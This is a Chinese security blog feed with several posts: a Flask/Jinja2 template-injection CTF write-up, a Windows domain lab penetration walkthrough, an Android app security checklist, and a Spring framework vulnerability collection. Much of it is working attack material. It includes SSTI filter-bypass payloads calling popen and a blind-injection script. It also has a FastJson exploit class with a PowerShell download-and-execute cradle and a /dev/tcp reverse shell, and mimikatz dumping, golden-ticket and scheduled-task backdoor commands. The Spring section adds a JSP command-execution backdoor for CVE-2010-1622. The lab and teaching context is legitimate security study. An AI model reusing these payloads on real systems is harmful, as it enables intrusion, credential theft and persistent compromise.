alt="image-20200423162231707"></p><p>再如果觉得其他参数中这种形式会被禁用，也可以更多参数分化执行。<code>request.args</code>也可以改为<code>request.values</code>。</p><pre><code>{{(((request|attr(request.args.f|format(request.args.h,request.args.h,request.args.a,request.args.h,request.args.h))|attr(request.args.f|format(request.args.h,request.args.h,request.args.b,request.args.h,request.args.h))|list).pop(-1)|attr(request.args.f|format(request.args.h,request.args.h,request.args.c,request.args.h,request.args.h))()).pop(118)|attr(request.args.f|format(request.args.h,request.args.h,request.args.d,request.args.h,request.args.h))|attr(request.args.f|format(request.args.h,request.args.h,request.args.e,request.args.h,request.args.h))).get('popen')('cat%20Th1s_is_F1114g').read()}}&amp;f=%s%s%s%s%s&amp;h=_&amp;a=class&amp;b=mro&amp;c=subclasses&amp;d=init&amp;e=globals </code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150534.png" alt="image-20200423163319930"></p><h4 id="flask-魔改"><a href="#flask-魔改" class="headerlink" title="flask 魔改"></a>flask 魔改</h4><p>如果禁用<code>{{ }}</code>这种符号，同时保持上面符号的禁用。默认的Jinja分隔符配置如下：</p><pre><code>{% ... %}用于声明{{ ... }}用于将表达式打印到模板输出用于注释不包括在模板输出#  ... ##用于行语句</code></pre><p>使用if的逻辑语句，由于不能直接用表达式打印，所以用以下布尔判断，循环pop中的值，得到334</p><pre><code>{%%20if%20((request|attr(("_"*2,"class","_"*2)|join)|attr(("_"*2,"mro","_"*2)|join)|list).pop(-1)|attr(("_"*2,"subclasses","_"*2)|join)()).pop(334)|string=="<class%20'os._wrap_close'>"%20%}111{%%20endif%20%}</class%20'os._wrap_close'></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150536.png" alt="image-20200424105108660"></p><p>但是最后获取的时候，需要对字符串进行截取，切片已经不能使用了，只能从字符串的方法中查找，可用的恰好有<code>index</code>，<code>find</code>，可以指定范围查找，比如<code>index</code>，指定范围从0开始，结束为1，如果为指定字符串返回正常，不然返回异常。</p><pre><code>{%%20if%20((((request|attr(("_"*2,"class","_"*2)|join)|attr(("_"*2,"mro","_"*2)|join)|list).pop(-1)|attr(("_"*2,"subclasses","_"*2)|join)()).pop(334)|attr(("_"*2,"init","_"*2)|join)|attr(("_"*2,"globals","_"*2)|join)).get('popen')('cat%20Th1s_is_F1114g').read()|string).index('n',0,1)%20%}{%%20endif%20%}</code></pre><p>使用类似如下的盲注脚本</p><pre><code># -*- coding: utf-8 -*-import requestsdef check(payload):    url = &#39;http://x.x.x.x:19009/user?name=&#39;+payload    r = requests.get(url)    if r.status_code == 200:        return Truepassword  = &#39;&#39;s = &#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&quot;$()&lt;=&gt;{|}_&#39;for i in range(0,40):    for c in s:        payload = &#39;{%%20if%20((((request|attr(("_"*2,"class","_"*2)|join)|attr(("_"*2,"mro","_"*2)|join)|list).pop(-1)|attr(("_"*2,"subclasses","_"*2)|join)()).pop(334)|attr(("_"*2,"init","_"*2)|join)|attr(("_"*2,"globals","_"*2)|join)).get("popen")("cat%20Th1s_is_F1114g").read()|string).index("'+c+'",'+str(i)+','+str(i+1)+')%20%}{%%20endif%20%}&#39;         if check(payload):            password += c            break    print(password)</code></pre><p>结果如下</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150543.png" alt="image-20200424120151112"></p><h4 id="flask-究极改"><a href="#flask-究极改" class="headerlink" title="flask 究极改"></a>flask 究极改</h4><p>在把<code>join</code>禁掉，还有<code>format</code>，把<code>values</code>和<code>args</code>也禁掉，不能从其他参数获取，这样上面的绕过就算是不能用了。</p><pre><code>blacklist = [&#39;__class__&#39;,&#39;__&#39;,&#39;[&#39;,&#39;]&#39;,&#39;join&#39;,&#39;values&#39;,&#39;args&#39;,&#39;format&#39;]</code></pre><p>查找一个request有关系的属性，尝试<code>form</code>，比如支持POST方法的话。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150545.png" alt="image-20200424132808887"></p><p>利用cookie参数</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150547.png" alt="image-20200424133033655"></p><p>利用请求头</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150549.png" alt="image-20200424133405205"></p><p>连起来就是，获取object子类。</p><pre><code>{{((request|attr(request.cookies.get('aa'))|attr(request.cookies.get('bb'))|list).pop(-1))|attr(request.cookies.get('cc'))()}}Cookie: aa=__class__;bb=__mro__;cc=__subclasses__</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150550.png" alt="image-20200424140101732"></p><h3 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h3><p>在flask plus中，采用的是session对象来解决问题，虽然在上一题中采用的是元组对象，但是只是因为其中没有禁用join，如果在plus中也禁用了session，还能怎么处理。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150552.png" alt="image-20200424141236793"></p><p>但实际并没有这么理想</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150555.png" alt="image-20200424145056229"></p><p>这里面能采用的还有哪些，比如</p><pre><code>{{(((redirect|attr('__cla'+'ss__')|attr('__mr'+'o__')|list)[-1]|attr('__subcla'+'sses__')())[342]|attr('__in'+'it__')|attr('__globals__'))['pop'+'en']('cat%20/Th1s_is_F1114g').read()}}</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150557.png" alt="image-20200424145127596"></p><p>如果<code>attr</code>被禁用，这种也不能使用，或者能使用<code>__getattribute__</code>替代，但是原代码里已经禁用了。</p><p>文章参考：<a href="https://hatboy.github.io/2018/04/19/Python沙箱逃逸总结" target="_blank" rel="noopener">Python沙箱逃逸总结</a>，<a href="https://xz.aliyun.com/t/52" target="_blank" rel="noopener">Python沙箱逃逸的n种姿势</a>，<a href="https://www.freebuf.com/articles/system/203208.html" target="_blank" rel="noopener">一文看懂Python沙箱逃逸</a>，<a href="https://xz.aliyun.com/t/288" target="_blank" rel="noopener">Python格式化字符串漏洞</a>，<a href="https://mp.weixin.qq.com/s/Lj4nCz0hag-AKQF_s79fQw" target="_blank" rel="noopener">一文掌握CTF中Python全部考点</a>，<a href="https://0day.work/jinja2-template-injection-filter-bypasses/" target="_blank" rel="noopener">Jinja2 template injection filter bypasses</a>，<a href="https://p0sec.net/index.php/archives/120/" target="_blank" rel="noopener">Flask/Jinja2模板注入中的一些绕过姿势</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;沙箱逃逸概述&quot;&gt;&lt;a href=&quot;#沙箱逃逸概述&quot; class=&quot;headerlink&quot; title=&quot;沙箱逃逸概述&quot;&gt;&lt;/a&gt;沙箱逃逸概述&lt;/h2&gt;&lt;p&gt;沙箱逃逸就是在在一个严格限制的python环境中，通过绕过限制和过滤达到执行更高权限，甚至getshell的
      
    
    </summary>
    
    
      <category term="python" scheme="/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>域靶场WP</title>
    <link href="/2020/04/%E5%9F%9F%E9%9D%B6%E5%9C%BAWP/"/>
    <id>/2020/04/域靶场WP/</id>
    <published>2020-04-10T08:31:54.000Z</published>
    <updated>2020-04-10T08:32:09.028Z</updated>
    
    <content type="html"><![CDATA[<p>域环境利用已有靶场，简单方便<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/3/" target="_blank" rel="noopener">http://vulnstack.qiyuanxuetang.net/vuln/detail/3/</a></p><p>web环境漏洞FastJson。利用<a href="https://github.com/RealBearcat/FastJson-JdbcRowSetImpl-RCE" target="_blank" rel="noopener">https://github.com/RealBearcat/FastJson-JdbcRowSetImpl-RCE</a> 修改而来</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114455.png" alt="image-20200407153757538"></p><p>参数为json字符串，可以简单的使用如下探测是否存在问题。</p><pre><code>{&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;}{&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;dnslog&quot;}{&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;{&quot;address&quot;:,&quot;val&quot;:&quot;dnslog&quot;}}</code></pre><p>比如，此处使用burp的DNS监听</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114500.png" alt="image-20200407140108169"></p><p>执行后会发现，说明存在问题。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114502.png" alt="image-20200407140121264"></p><p>至于版本，可以在一般测试中，构造错误的json字符串查看报错信息，但此处没有错误显示，直接使用几个较高版本的POC测试。</p><p>此处直接使用47的POC，由于是Windows系统，则利用cs使用powershell来反弹shell。</p><pre><code>import java.lang.Runtime;import java.lang.Process;public class Exploit {    public Exploit(){        try{            // Runtime.getRuntime().exec(&quot;/bin/bash -i &gt;&amp;/dev/tcp/192.168.120.130/8888&lt;&amp;1&quot;);            Runtime.getRuntime().exec(&quot;powershell.exe -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring(\&#39;http://192.168.120.130:80/a\&#39;))\&quot;&quot;);        }catch(Exception e){            e.printStackTrace();        }    }    public static void main(String[] argv){        Exploit e = new Exploit();    }}</code></pre><p>执行后，在cs端就可以收到shell了。利用ms15-051提权，提权模块可能是添加的插件。获得system权限。还可以看到存在一个内网地址10.10.10.80。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114504.png" alt="image-20200408095902201"></p><p>利用mimikatz获取密码，只能读取到当前登陆账号的明文密码。</p><pre><code>mimikatz sekurlsa::logonpasswords</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114506.png" alt="image-20200408134439940"></p><p>不过如果使用了管理员账号来执行操作修改配置，也可以读取到管理员hash。如果使用明文密码登陆修改就可以抓到。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114508.png" alt="image-20200408151440720"></p><p>如果提示报错，尝试修改注册表</p><pre><code>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</code></pre><p>收集信息可知以下信息</p><pre><code>域名：DC.de1ay.com域主机：10.10.10.10域用户：Administrator，delay,mssql域管理员：Administrator两个网卡：192.168.120.0/24，10.10.10.0/24主机：存在两个主机(192.168.120.201，10.10.10.10)存在360主机防御系统，不过并没有干涉</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114510.png" alt="image-20200408100546410"></p><p>尝试利用de1ay用户来登陆PC，利用psexec登陆不成功。</p><p>使用psexec登陆，DC机显示成功但是没有获得shell，可能是没成功把</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114512.png" alt="image-20200408155334127"></p><p>然后利用net共享，先用mimikatz生成pth凭据。</p><pre><code>sekurlsa::pth /domain:. /user:Administrator /ntlm: 70be8675cd511daa9be4b8f49e829327</code></pre><p>net和psexec的时候还是不成功，报错。利用cs自身的pth模块执行，还是报错，拒绝访问</p><pre><code>pth DE1AY\de1ay 161cff084477fe596a5db81874498a24</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114514.png" alt="image-20200408163645027"></p><p>再尝试利用金票，直接登陆到主机上，上传mimikatz执行。</p><pre><code>lsadump::dcsync /domain:de1ay.com /user:krbtgt</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114515.png" alt="image-20200409164051760"></p><p>得到HASH之后使用mimikatz中的kerberos::golden功能生成金票golden.kiribi  </p><pre><code>kerberos::golden /admin:administrator /domain:de1ay.com /sid:S-1-5-21-2756371121-2868759905-3853650604 /krbtgt:82dfc71b72a11ef37d663047bc2088fb /ticket:golden.kiribi</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114517.png" alt="image-20200409164616356"></p><p>通过mimikatz中的kerberos::ptt将golden.kiribi导入内存中 </p><pre><code>kerberos::purge   //删除票据kerberos::ptt golden.kiribi  //导入票据kerberos::list  //查看票据</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114519.png" alt="image-20200409164906689"></p><p>查看DC域主机默认共享，可以连接到域主机，上传文件执行。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114520.png" alt="image-20200409165120018"></p><p>先利用域内主机创建一个端口转发，先创建一个dns的监听，然后利用已有shell。再去创建一个listener。如下dc。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114522.png" alt="image-20200409172526385"></p><p>或者直接利用已有shell来创建listener，再生成exe。利用dc监听来生成exe</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114524.png" alt="image-20200409172758964"></p><p>利用<code>copy beacon.exe \\DC.de1ay.com\c$\Users\de1ay\</code>到DC主机上</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114526.png" alt="image-20200409170358135"></p><p>创建计划任务执行后门，很快就有DC主机上线了。</p><pre><code>schtasks /create /s DC.de1ay.com /ru &quot;SYSTEM&quot; /tn testdc /sc DAILY /tr C:\\Users\\de1ay\\beacon.exe /Fschtasks /run /s DC.de1ay.com /tn testdc /i</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114527.png" alt="image-20200409173044533"></p><p>对于用户PC机，同样可以利用金票来执行，后面的操作和上面类似。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114529.png" alt="image-20200409174013572"></p><p>最后就可以获得shell。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114530.png" alt="image-20200409174748884"></p><p>再尝试使用银票，生成前删除全部票据，不能访问。</p><pre><code>klist purge</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114532.png" alt="image-20200410090753302"></p><p>这里使用de1ay的hash</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114534.png" alt="image-20200410091300403"></p><pre><code>kerberos::golden /domain:de1ay.com /sid:S-1-5-21-2756371121-2868759905-3853650604 /target:DC.de1ay.org /service:cifs /rc4:161cff084477fe596a5db81874498a24 /user:de1ay /ptt</code></pre><p>这里使用/ptt直接导入内存，或者先生成票据，再使用上面的kerberos::ptt导入内存。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114536.png" alt="image-20200410091815717"></p><p>查看是否可以访问</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114538.png" alt="image-20200410091924771"></p><p>同样shell以后可以看到是个用户权限</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114540.png" alt="image-20200410092340435"></p><p>在尝试使用ms14-068，DC机是Windows2012，没有补丁KB3011780，同样删除票据</p><p>由于主机上没有python环境，pykek不能使用，暂时没有exe版本的pykek。下载使用编译完成的exe文件</p><p><a href="https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068" target="_blank" rel="noopener">https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068</a></p><pre><code>ms14-068.exe -u de1ay@de1ay.com -s S-1-5-21-2756371121-2868759905-3853650604 -d DC.de1ay.com</code></pre><p>生成cache缓存文件，再使用mimikatz来导入</p><pre><code>kerberos::ptc TGT_de1ay@de1ay.com.ccache</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114542.png" alt="image-20200410100442974"></p><p>不过回过头看，之前在cs中执行利用psexec和已有凭据执行psh的时候应该是成功的。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114544.png" alt="image-20200410113800119"></p><p>执行后在DC上会有短暂的ps调用显示，但至于为啥没有回显和连接，也许是连接错误。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;域环境利用已有靶场，简单方便&lt;a href=&quot;http://vulnstack.qiyuanxuetang.net/vuln/detail/3/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://vulnstack.qiyuanxuetang.n
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>APP应用安全检测</title>
    <link href="/2020/04/APP%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E6%A3%80%E6%B5%8B/"/>
    <id>/2020/04/APP应用安全检测/</id>
    <published>2020-04-10T08:30:24.000Z</published>
    <updated>2020-04-10T08:30:33.382Z</updated>
    
    <content type="html"><![CDATA[<h2 id="测试说明"><a href="#测试说明" class="headerlink" title="测试说明"></a>测试说明</h2><p>测试内容根据绿盟APP测试流程进行检查，APP是前几年谷歌CTF的中的APK。</p><h2 id="客户端安全"><a href="#客户端安全" class="headerlink" title="客户端安全"></a>客户端安全</h2><h3 id="安装包签名"><a href="#安装包签名" class="headerlink" title="安装包签名"></a>安装包签名</h3><pre><code>jarsigner.exe -verify WhyShouldIPay.apk -verbose -certs</code></pre><p>输出结果为“jar 已验证”时，表示签名正常。  </p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410162840.png" alt="image-20200410140458826"></p><h3 id="程序保护"><a href="#程序保护" class="headerlink" title="程序保护"></a>程序保护</h3><p>此处使用jadx打开APK，若软件使用混淆好加壳则不存在问题。如下打开后是下面这种，则是没添加保护。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410162841.png" alt="image-20200410140922318"></p><h3 id="应用完整性检测"><a href="#应用完整性检测" class="headerlink" title="应用完整性检测"></a>应用完整性检测</h3><p>反编译APK，修改其中的res资源文件，把其中的一个图片替换为其他图片</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410162843.png" alt="image-20200410141438100"></p><p>如果完整性是检查MANIFEST.MF 中的数据则存在风险。若回编译后安装使用正常，则代表无检查。</p><h3 id="组件安全"><a href="#组件安全" class="headerlink" title="组件安全"></a>组件安全</h3><p>主要查看是否存在<code>android:exported=&quot;true&quot;</code>属性的组件，存在属性的组件可以被第三方导出。但是部分组件需要被调用来执行，比如组件中存在<code>&lt;intent-filter&gt;</code>过滤器。这种组件就相当于允许导出。</p><p>根据不同的要求这种情况不一定算是风险项。比如此activity组件，由于是首启动页。需要被调用执行，也就不存在上面所说的不允许被导出情况。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410162846.png" alt="image-20200410144025704"></p><h3 id="webview组件安全"><a href="#webview组件安全" class="headerlink" title="webview组件安全"></a>webview组件安全</h3><p>Android 4.2 版本以下的 webview 组件存在安全漏洞 ，检测本地是否会被利用的方式是允许运行的sdk最小不能低于17，来避免在受影响的手机上使用。</p><p><img src="APP应用安全检测.assets/image-20200410144355967.png" alt="image-20200410144355967"></p><h2 id="敏感信息安全"><a href="#敏感信息安全" class="headerlink" title="敏感信息安全"></a>敏感信息安全</h2><h3 id="数据文件"><a href="#数据文件" class="headerlink" title="数据文件"></a>数据文件</h3><p>查看安装app目录文件权限是否为<code>rw-rw----</code>当前用户可读性模式。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410162847.png" alt="image-20200410145303695"></p><p>如果文件目录下存在database目录，db类型的文件，说明使用本地数据库，查看数据文件是否有明文敏感信息。</p><h3 id="日志文件"><a href="#日志文件" class="headerlink" title="日志文件"></a>日志文件</h3><p>查看日志文件中是否输出了一些敏感信息，比如账号密码，认证session等</p><p>可以通过adb命令查看，也可以使用第三方连接软件查看<code>adb logcat</code></p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410162849.png" alt="image-20200410145927703"></p><h2 id="密码键盘安全性"><a href="#密码键盘安全性" class="headerlink" title="密码键盘安全性"></a>密码键盘安全性</h2><h3 id="屏幕录像"><a href="#屏幕录像" class="headerlink" title="屏幕录像"></a>屏幕录像</h3><p>这种问题从测过的软件和客户来看，在意的程度不高，可能也就在银行金融类APP上会比较在意。</p><p>比如利用adb截图来测试是否可以对屏幕进行记录<code>adb shell /system/bin/screencap -p /path/a.png</code></p><p>如果打开后，可以看到输入的数据，或者可以看到键盘点击反馈则算安全问题。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410162850.png" alt="image-20200410151346239"></p><h3 id="随机键盘"><a href="#随机键盘" class="headerlink" title="随机键盘"></a>随机键盘</h3><p>这种目前只在银行APP支付的时候输入银行卡密码的时候存在，一般APP并没有此要求。可以根据情况来确定是否需要检测此项。</p><h2 id="安全策略"><a href="#安全策略" class="headerlink" title="安全策略"></a>安全策略</h2><h3 id="密码复杂度"><a href="#密码复杂度" class="headerlink" title="密码复杂度"></a>密码复杂度</h3><p>APP登陆的密码一般要求大小写字母和数字，需要其中两种以上，不少于八位。如果允许使用纯数字或者纯字母，且长度没有要求的情况下，则存在问题。</p><h3 id="账号登陆限制"><a href="#账号登陆限制" class="headerlink" title="账号登陆限制"></a>账号登陆限制</h3><p>根据业务需要，是否允许同一个账号多设备登陆同时操作，如果不允许则尝试多设备登陆，登陆正常使用则存在问题。</p><h3 id="账号锁定机制"><a href="#账号锁定机制" class="headerlink" title="账号锁定机制"></a>账号锁定机制</h3><p>账号可能存在被爆破密码的可能，在有些不适合使用验证码的场景下，对账号执行登陆错误次数的限制是可以有效防止账号被暴力破解的方式之一。</p><h3 id="验证码安全性"><a href="#验证码安全性" class="headerlink" title="验证码安全性"></a>验证码安全性</h3><p>查看使用的验证码是否能被简单识别，使用能正常使用和防止登陆中被多次验证的问题</p><h3 id="安全退出"><a href="#安全退出" class="headerlink" title="安全退出"></a>安全退出</h3><p>账号在登陆退出后，查看是否正确的注销session。利用原session是否还可以请求到数据。</p><h3 id="密码修改验证"><a href="#密码修改验证" class="headerlink" title="密码修改验证"></a>密码修改验证</h3><p>验证修改密码的功能是否存在问题，是否需要原密码判断，修改的复杂度等是否符合要求</p><h3 id="activity-界面劫持"><a href="#activity-界面劫持" class="headerlink" title="activity 界面劫持"></a>activity 界面劫持</h3><p>如果攻击者注册一个receiver，响应android.intent.action.BOOT_COMPLETED，使得开启启动一个service；在这个service中启动一个计时器，不停枚举当前进程中是否有预设的进程启动，如果发现有预设进程，则使用FLAG_ACTIVITY_NEW_TASK启动自己的钓鱼界面，而正常应用的界面则隐藏在钓鱼界面的后面。</p><p>比如使用<a href="https://github.com/abigbread/Hijack来创建一个apk。循环监听设置好的app。" target="_blank" rel="noopener">https://github.com/abigbread/Hijack来创建一个apk。循环监听设置好的app。</a></p><h2 id="进程防护"><a href="#进程防护" class="headerlink" title="进程防护"></a>进程防护</h2><h3 id="动态注入"><a href="#动态注入" class="headerlink" title="动态注入"></a>动态注入</h3><p>可以利用成熟的HOOK框架来尝试，比如使用xpose，在对于进程文件中，查看maps文件。其中可以看到对于的xpose文件</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410162854.png" alt="image-20200410155352701"></p><p>或者使用Frida来加载其中的所有的类，查看是否正常获取。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410162856.png" alt="image-20200410161814489"></p><h2 id="通信安全"><a href="#通信安全" class="headerlink" title="通信安全"></a>通信安全</h2><h3 id="通信加密"><a href="#通信加密" class="headerlink" title="通信加密"></a>通信加密</h3><p>这种更像是web漏洞，主要查看是否使用了https加密流量，并且是否有正确的证书配置。加密算法是否在TLSv1.1以上。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;测试说明&quot;&gt;&lt;a href=&quot;#测试说明&quot; class=&quot;headerlink&quot; title=&quot;测试说明&quot;&gt;&lt;/a&gt;测试说明&lt;/h2&gt;&lt;p&gt;测试内容根据绿盟APP测试流程进行检查，APP是前几年谷歌CTF的中的APK。&lt;/p&gt;
&lt;h2 id=&quot;客户端安全&quot;&gt;&lt;a 
      
    
    </summary>
    
    
      <category term="Android逆向" scheme="/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>Spring 框架漏洞集合</title>
    <link href="/2020/04/Spring-%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/"/>
    <id>/2020/04/Spring-框架漏洞集合/</id>
    <published>2020-04-01T05:18:10.000Z</published>
    <updated>2020-04-01T05:18:10.516Z</updated>
    
    <content type="html"><![CDATA[<p>虽说是Spring框架漏洞，但以下包含并不仅Spring Framework，Spring Boot，还有Spring Cloud，Spring Data，Spring Security等。</p><h3 id="CVE-2010-1622-Spring-Framework-class-classLoader类远程代码执行"><a href="#CVE-2010-1622-Spring-Framework-class-classLoader类远程代码执行" class="headerlink" title="CVE-2010-1622 Spring Framework class.classLoader类远程代码执行"></a>CVE-2010-1622 Spring Framework class.classLoader类远程代码执行</h3><p>影响版本：SpringSource Spring Framework 3.0.0 - 3.0.2、SpringSource Spring Framework 2.5.0 - 2.5.7</p><p>Spring框架提供了一种机制，该机制使用客户端提供的数据来更新对象属性。这个机制允许攻击者修改用于加载对象的类加载器的属性（通过’class.classloader’）。这可能导致任意命令执行，例如，攻击者可以修改URL。由类加载器用来指向攻击者控制的位置。</p><pre><code>示例：POST /adduser HTTP/1.0...firstName = Tavis&amp;lastName = Ormandy如果Person是表单的支持对象，则firstName和lastName属性将设置为相应的值。为了支持更复杂的类，Spring还支持点表示法，因此user.address.street = Disclosure + Str。将等效于：frmObj.getUser().getAddress().setStreet(&quot;Disclosure Str.&quot;)  问题是Spring Beans的CachedIntrospectionResults类枚举了可从用户表单提交中设置的属性，使用  java.beans.Introspector.getBeanInfo()而不指定停止类，这意味着&#39; class &#39;属性及其后的所有内容均可用于HTTP请求中的设置。攻击如果攻击者使用以下HTTP参数向表单控制器提交HTTP请求：POST /adduser HTTP/1.0...class.classLoader.URLs[0] = jar:http://attacker/spring-exploit.jar!她将 使用自己的网址覆盖frmObj.getClass().getClassLoader().getURLs() 返回的数组中的第0个元素.它将是哪个类加载器？在Apache Tomcat上的情况下，它指org.apache.catalina.loader.WebappClassLoader</code></pre><p>如何构造这个jar，需要包含以下信息：</p><pre><code>- META-INF/spring-form.tld - 定义spring表单标签并指定实现为标签文件而不是类- META-INF/tags/中的标签文件，包含有标签定义（任意Java代码）</code></pre><p>/META-INF/spring-form.tld文件：</p><pre><code>&lt;!-- &lt;form:input/&gt; tag --&gt;    &lt;tag-file&gt;    &lt;name&gt;input&lt;/name&gt;    &lt;path&gt;/META-INF/tags/InputTag.tag&lt;/path&gt;  &lt;/tag-file&gt;</code></pre><p>/META-INF/tags/InputTag.tag</p><pre><code>&lt;%@ tag dynamic-attributes=&quot;dynattrs&quot; %&gt;&lt;% j java.lang.Runtime.getRuntime().exec(&quot;mkdir /tmp/PWNED&quot;); %&gt;</code></pre><p>做出这样的替换后，当开发者在controller中将任何一个对象绑定表单，并且最终展示的jsp内容有下面这些：</p><pre><code>&lt;%@ taglib prefix=&quot;form&quot; uri=&quot;http://www.springframework.org/tags/form&quot;%&gt;  &lt;form:form commandName=&quot;user&quot;&gt;&lt;form:input path=&quot;name&quot;/&gt;&lt;/form:form&gt;</code></pre><p>攻击者访问url,即可触发远程代码执行的效果:</p><pre><code>http://inbreak.net/springmvc/testjsp.htm? class.classLoader.URLs[0]=jar:https://inbreak.net/spring-exploit.jar!/</code></pre><p>如果服务器大于tomcat6.0.28版本，这样做会把所有的input标签替换掉，导致不能正常显示。需要修改</p><p>spring-form.tld，给其中的inputtag改名，name改为inputkxlzx：</p><pre><code>&lt;tag&gt;        &lt;name&gt;inputkxlzx&lt;/name&gt;  //什么名字都行</code></pre><p>在文件中新加入一个tag，叫做input：</p><pre><code>&lt;tag-file&gt;    &lt;name&gt;input&lt;/name&gt;    &lt;path&gt;/WEB-INF/tags/InputTag.tag&lt;/path&gt;  &lt;/tag-file&gt;</code></pre><p>InputTag.tag的内容：</p><pre><code>&lt;%@ tag dynamic-attributes=&quot;dynattrs&quot; %&gt;&lt;%if (request.getParameter(&quot;kxlzxcmd&quot;)!=null)     exec(request.getParameter(&quot;kxlzxcmd&quot;)); %&gt;&lt;form:inputkxlzx path=&quot;${dynattrs.path}&quot;&gt;&lt;/form:inputkxlzx&gt;</code></pre><p>访问的时候需要在参数中携带kxlzxcmd</p><pre><code>/test.htm?name=kxlzx&amp;kxlzxcmd=calc   //包含input的页面</code></pre><p><a href="http://blog.o0o.nu/2010/06/cve-2010-1622.html" target="_blank" rel="noopener">http://blog.o0o.nu/2010/06/cve-2010-1622.html</a></p><p><a href="https://www.inbreak.net/archives/377" target="_blank" rel="noopener">https://www.inbreak.net/archives/377</a></p><h3 id="CVE-2013-4152-Spring-Framework中的XML外部实体（XXE）注入"><a href="#CVE-2013-4152-Spring-Framework中的XML外部实体（XXE）注入" class="headerlink" title="CVE-2013-4152 Spring Framework中的XML外部实体（XXE）注入"></a>CVE-2013-4152 Spring Framework中的XML外部实体（XXE）注入</h3><p>影响版本：3.0.0至3.2.3、4.0.0.M1</p><p>受影响版本容易受到XML外部实体（XXE）注入的攻击。该<code>SourceHttpMessageConverter</code>处理器不会禁用外部实体解析，这使远程攻击者可以读取任意文件。</p><p>当传输xml结构体时，如</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;   &lt;username&gt;John&lt;/username&gt;&lt;/xml&gt;</code></pre><p>外部XML实体- 